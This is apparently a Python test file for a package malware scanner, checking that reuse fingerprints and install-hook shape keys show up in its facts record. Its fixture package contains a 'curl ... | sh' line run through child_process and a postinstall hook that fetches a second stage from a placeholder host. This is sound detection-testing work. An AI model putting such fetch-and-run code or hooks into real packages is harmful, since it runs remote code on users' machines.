"""A scan asked for reuse keys (`reuse_keys`) reports, in the facts record, each code file's reuse fingerprint and each
install hook's shape key: exactly the keys the code-reuse detector looks up, so the keys the platform publishes for a
condemned release catch its next variant. Data files, declaration files and short files have none. A scan not asked
for them reports nothing new: its facts record is byte for byte what it was."""

from __future__ import annotations

import json

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.intel.malware.reuse_index import HookShape, ReuseIndex
from cordon_scanner.report.facts import ScanFacts

CODE = (
    b"const payload = require('child_process');\npayload.exec('curl https://example.invalid/x | sh');\n"
    * 4
)
HOOK = "node install.js https://example.invalid/stage2"


class Package:
    @staticmethod
    def tree(root):
        (root / "package.json").write_text(
            json.dumps({"name": "demo", "version": "1.0.0", "scripts": {"postinstall": HOOK}}),
            encoding="utf-8",
        )
        (root / "index.js").write_bytes(CODE)
        (root / "types.d.ts").write_bytes(
            b"export declare function demo(input: string): string;\n" * 8
        )
        (root / "data.json").write_text(json.dumps({"k": "v" * 400}), encoding="utf-8")
        return root

    @staticmethod
    def facts(root, *, reuse: bool) -> dict:
        config = Config.default().with_overrides(use_cache=False, reuse_keys=reuse)
        return ScanFacts.of(Scanner(config).scan(root))


class TestAScanAskedForReuseKeys:
    def test_it_reports_the_code_files_fingerprint_and_the_hooks_shape_key(self, tmp_path):
        reuse = Package.facts(Package.tree(tmp_path), reuse=True)["package"]["reuse"]
        assert reuse["fingerprint"] == "crix1" and reuse["complete"] is True
        assert reuse["code"] == [ReuseIndex.fingerprint(CODE).hex()]
        assert reuse["hook"] == [HookShape.key(HOOK).hex()]

    def test_the_same_code_under_another_name_and_spacing_has_the_same_key(self, tmp_path):
        one = tmp_path / "a"
        one.mkdir()
        first = Package.facts(Package.tree(one), reuse=True)
        other = tmp_path / "b"
        other.mkdir()
        Package.tree(other)
        (other / "index.js").unlink()
        (other / "lib.js").write_bytes(CODE.replace(b"\n", b"\n\n  "))
        second = Package.facts(other, reuse=True)
        assert first["package"]["reuse"]["code"] == second["package"]["reuse"]["code"]


class TestAnOrdinaryScan:
    def test_its_facts_record_carries_no_reuse_block(self, tmp_path):
        assert "reuse" not in Package.facts(Package.tree(tmp_path), reuse=False)["package"]
